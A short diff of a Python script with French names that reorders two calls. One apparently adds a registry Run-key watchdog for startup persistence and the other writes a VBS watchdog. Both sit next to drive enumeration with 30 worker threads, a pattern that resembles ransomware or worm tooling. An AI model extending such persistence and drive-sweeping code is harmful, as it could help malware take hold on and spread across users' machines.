@@ -306,8 +306,8 @@ def main():
     if existDir.lower() not in folders_exclus:
         folders_exclus.append(existDir.lower())
 
-    ajouter_run_key_watchdog()
     create_watchdog_vbs()
+    ajouter_run_key_watchdog()
 
     lecteurs = get_existing_root_path()
     max_workers = 30
